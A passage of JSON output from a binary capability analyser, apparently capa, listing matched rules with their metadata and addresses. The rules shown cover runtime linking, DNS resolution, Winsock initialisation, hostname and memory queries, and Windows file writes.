                                  "value": 1651777220
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777220
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777194
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777194
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777259
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777259
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777233
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777233
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777207
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777207
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777273
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777273
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777181
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777181
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777246
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777246
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651777220
                        },
                        {
                          "type": "absolute",
                          "value": 1651777194
                        },
                        {
                          "type": "absolute",
                          "value": 1651777259
                        },
                        {
                          "type": "absolute",
                          "value": 1651777233
                        },
                        {
                          "type": "absolute",
                          "value": 1651777207
                        },
                        {
                          "type": "absolute",
                          "value": 1651777273
                        },
                        {
                          "type": "absolute",
                          "value": 1651777181
                        },
                        {
                          "type": "absolute",
                          "value": 1651777246
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "nzxor"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651777216
                        },
                        {
                          "type": "absolute",
                          "value": 1651777280
                        },
                        {
                          "type": "absolute",
                          "value": 1651777190
                        },
                        {
                          "type": "absolute",
                          "value": 1651777255
                        },
                        {
                          "type": "absolute",
                          "value": 1651777229
                        },
                        {
                          "type": "absolute",
                          "value": 1651777203
                        },
                        {
                          "type": "absolute",
                          "value": 1651777268
                        },
                        {
                          "type": "absolute",
                          "value": 1651777176
                        },
                        {
                          "type": "absolute",
                          "value": 1651777242
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand number",
                          "index": 1,
                          "operand_number": 3988292384
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651777280
                        },
                        {
                          "type": "absolute",
                          "value": 1651777157
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "link many functions at runtime": {
        "meta": {
          "name": "link many functions at runtime",
          "namespace": "linking/runtime-linking",
          "authors": [
            "moritz.raabe@mandiant.com",
            "joakim@intezer.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "b7b5e1253710d8927cbe07d52d2d2e10:0x401000"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: link many functions at runtime\r\n    namespace: linking/runtime-linking\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - joakim@intezer.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    examples:\r\n      - b7b5e1253710d8927cbe07d52d2d2e10:0x401000\r\n  features:\r\n    - or:\r\n      - count(match(link function at runtime on Windows)): 5 or more\r\n      - count(match(link function at runtime on Linux)): 5 or more\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651777328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Windows"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651778369
                    },
                    {
                      "type": "absolute",
                      "value": 1651778305
                    },
                    {
                      "type": "absolute",
                      "value": 1651778433
                    },
                    {
                      "type": "absolute",
                      "value": 1651778497
                    },
                    {
                      "type": "absolute",
                      "value": 1651778561
                    },
                    {
                      "type": "absolute",
                      "value": 1651778625
                    },
                    {
                      "type": "absolute",
                      "value": 1651778689
                    },
                    {
                      "type": "absolute",
                      "value": 1651778753
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Linux"
                      }
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794128
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Windows"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651796416
                    },
                    {
                      "type": "absolute",
                      "value": 1651795401
                    },
                    {
                      "type": "absolute",
                      "value": 1651796365
                    },
                    {
                      "type": "absolute",
                      "value": 1651794897
                    },
                    {
                      "type": "absolute",
                      "value": 1651794961
                    },
                    {
                      "type": "absolute",
                      "value": 1651795025
                    },
                    {
                      "type": "absolute",
                      "value": 1651795089
                    },
                    {
                      "type": "absolute",
                      "value": 1651795153
                    },
                    {
                      "type": "absolute",
                      "value": 1651795217
                    },
                    {
                      "type": "absolute",
                      "value": 1651795281
                    },
                    {
                      "type": "absolute",
                      "value": 1651796569
                    },
                    {
                      "type": "absolute",
                      "value": 1651794777
                    },
                    {
                      "type": "absolute",
                      "value": 1651796314
                    },
                    {
                      "type": "absolute",
                      "value": 1651794657
                    },
                    {
                      "type": "absolute",
                      "value": 1651796518
                    },
                    {
                      "type": "absolute",
                      "value": 1651796263
                    },
                    {
                      "type": "absolute",
                      "value": 1651796467
                    },
                    {
                      "type": "absolute",
                      "value": 1651796664
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Linux"
                      }
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651798640
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Windows"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651798897
                    },
                    {
                      "type": "absolute",
                      "value": 1651798961
                    },
                    {
                      "type": "absolute",
                      "value": 1651799025
                    },
                    {
                      "type": "absolute",
                      "value": 1651799209
                    },
                    {
                      "type": "absolute",
                      "value": 1651799273
                    },
                    {
                      "type": "absolute",
                      "value": 1651799393
                    },
                    {
                      "type": "absolute",
                      "value": 1651799145
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Linux"
                      }
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651801824
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Windows"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651802225
                    },
                    {
                      "type": "absolute",
                      "value": 1651802289
                    },
                    {
                      "type": "absolute",
                      "value": 1651802409
                    },
                    {
                      "type": "absolute",
                      "value": 1651802473
                    },
                    {
                      "type": "absolute",
                      "value": 1651802537
                    },
                    {
                      "type": "absolute",
                      "value": 1651802601
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 5,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "match",
                        "match": "link function at runtime on Linux"
                      }
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "resolve DNS": {
        "meta": {
          "name": "resolve DNS",
          "namespace": "communication/dns",
          "authors": [
            "william.ballenthin@mandiant.com",
            "johnk3r",
            "joakim@intezer.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "DNS Communication",
                "Resolve"
              ],
              "objective": "Communication",
              "behavior": "DNS Communication",
              "method": "Resolve",
              "id": "C0011.001"
            }
          ],
          "references": [],
          "examples": [
            "17264e3126a97c319a6a0c61e6da951e:0x5FDC25D0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: resolve DNS\r\n    namespace: communication/dns\r\n    authors:\r\n      - william.ballenthin@mandiant.com\r\n      - johnk3r\r\n      - joakim@intezer.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - Communication::DNS Communication::Resolve [C0011.001]\r\n    examples:\r\n      - 17264e3126a97c319a6a0c61e6da951e:0x5FDC25D0\r\n  features:\r\n    - or:\r\n      - api: gethostbyname\r\n      - api: ws2_32.gethostbyname\r\n      - api: ws2_32.#52 = gethostbyname\r\n      - api: DnsQuery_A\r\n      - api: DnsQuery_W\r\n      - api: DnsQuery_UTF8\r\n      - api: DnsQueryEx\r\n      - api: GetAddrInfo\r\n      - api: ws2_32.#24 = GetAddrInfoW\r\n      - api: GetAddrInfoEx\r\n      - api: getaddrinfo\r\n      - api: ws2_32.#98 = getaddrinfo\r\n      - api: getnameinfo\r\n      - api: ws2_32.#99 = getnameinfo\r\n      - api: gethostent\r\n      - api: System.Net.Dns::GetHostAddresses\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651780672
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "gethostbyname"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651780746
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ws2_32.#52",
                      "description": "gethostbyname"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DnsQuery_A"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DnsQuery_W"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DnsQuery_UTF8"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DnsQueryEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAddrInfo"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ws2_32.#24",
                      "description": "GetAddrInfoW"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAddrInfoEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "getaddrinfo"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ws2_32.#98",
                      "description": "getaddrinfo"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "getnameinfo"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ws2_32.#99",
                      "description": "getnameinfo"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "gethostent"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Net.Dns::GetHostAddresses"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "initialize Winsock library": {
        "meta": {
          "name": "initialize Winsock library",
          "namespace": "communication/socket",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "Socket Communication",
                "Initialize Winsock Library"
              ],
              "objective": "Communication",
              "behavior": "Socket Communication",
              "method": "Initialize Winsock Library",
              "id": "C0001.009"
            }
          ],
          "references": [],
          "examples": [
            "6A352C3E55E8AE5ED39DC1BE7FB964B1:0x10001D30"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: initialize Winsock library\r\n    namespace: communication/socket\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - Communication::Socket Communication::Initialize Winsock Library [C0001.009]\r\n    examples:\r\n      - 6A352C3E55E8AE5ED39DC1BE7FB964B1:0x10001D30\r\n  features:\r\n    - or:\r\n      - api: ws2_32.WSAStartup\r\n      - api: ws2_32.#115 = WSAStartup\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651780672
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WSAStartup"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651780694
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ws2_32.#115",
                      "description": "WSAStartup"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get hostname": {
        "meta": {
          "name": "get hostname",
          "namespace": "host-interaction/os/hostname",
          "authors": [
            "moritz.raabe@mandiant.com",
            "joakim@intezer.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "objective": "Discovery",
              "behavior": "System Information Discovery",
              "method": "",
              "id": "E1082"
            }
          ],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x4052A0",
            "7351f8a40c5450557b24622417fc478d:0x405438"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get hostname\r\n    namespace: host-interaction/os/hostname\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - joakim@intezer.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    mbc:\r\n      - Discovery::System Information Discovery [E1082]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4052A0\r\n      - 7351f8a40c5450557b24622417fc478d:0x405438\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetComputerName\r\n      - api: kernel32.GetComputerNameEx\r\n      - api: GetComputerObjectName\r\n      - api: ws2_32.gethostname\r\n      - api: gethostname\r\n      - property/read: System.Environment::MachineName\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651780672
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerNameEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerObjectName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "gethostname"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651780730
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::MachineName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651788624
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788787
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerNameEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788845
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerObjectName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "gethostname"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::MachineName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get memory capacity": {
        "meta": {
          "name": "get memory capacity",
          "namespace": "host-interaction/hardware/memory",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x4052A0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get memory capacity\r\n    namespace: host-interaction/hardware/memory\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4052A0\r\n  features:\r\n    - or:\r\n      - api: kernel32.GlobalMemoryStatus\r\n      - api: kernel32.GlobalMemoryStatusEx\r\n        # TODO kernel32.GetSystemInfo with offset\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651780816
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GlobalMemoryStatus"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GlobalMemoryStatusEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651780979
                    }
                  ],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "write file on Windows": {
        "meta": {
          "name": "write file on Windows",
          "namespace": "host-interaction/file-system/write",
          "authors": [
            "william.ballenthin@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Writes File"
              ],
              "objective": "File System",
              "behavior": "Writes File",
              "method": "",
              "id": "C0052"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 01-04.exe_:0x4011FC",
            "563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x1400025C4"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: write file on Windows\r\n    namespace: host-interaction/file-system/write\r\n    authors:\r\n      - william.ballenthin@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - File System::Writes File [C0052]\r\n    examples:\r\n      - Practical Malware Analysis Lab 01-04.exe_:0x4011FC\r\n      # ntdll\r\n      - 563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x1400025C4\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - optional:\r\n          - basic block:\r\n            - or:\r\n              - number: 0x40000000 = GENERIC_WRITE\r\n              - number: 0x2 = FILE_WRITE_DATA\r\n              - match: create or open file\r\n          - call:\r\n            - or:\r\n              - number: 0x40000000 = GENERIC_WRITE\r\n              - number: 0x2 = FILE_WRITE_DATA\r\n              - match: create or open file\r\n        - or:\r\n          - api: kernel32.WriteFile\r\n          - api: kernel32.WriteFileEx\r\n          - api: NtWriteFile\r\n          - api: ZwWriteFile\r\n          - api: _fwrite\r\n          - api: fwrite\r\n      - api: System.IO.File::WriteAllBytes\r\n      - api: System.IO.File::WriteAllBytesAsync\r\n      - api: System.IO.File::WriteAllLines\r\n      - api: System.IO.File::WriteAllLinesAsync\r\n      - api: System.IO.File::WriteAllText\r\n      - api: System.IO.File::WriteAllTextAsync\r\n      - api: System.IO.File::AppendAllLines\r\n      - api: System.IO.File::AppendAllLinesAsync\r\n      - api: System.IO.File::AppendAllText\r\n      - api: System.IO.File::AppendAllTextAsync\r\n      - api: System.IO.File::AppendText\r\n      - api: System.IO.FileInfo::AppendText\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651783584
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytes"
                    }
                  },
